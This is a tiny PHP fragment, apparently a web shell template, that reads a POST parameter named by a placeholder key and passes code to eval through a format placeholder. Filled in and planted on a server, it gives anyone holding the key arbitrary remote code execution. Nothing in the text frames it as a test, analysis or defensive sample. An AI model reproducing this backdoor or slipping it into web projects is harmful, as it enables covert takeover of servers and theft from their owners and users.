<?

$x=$_POST['%%PASSKEY%%'];eval(%s);

?>
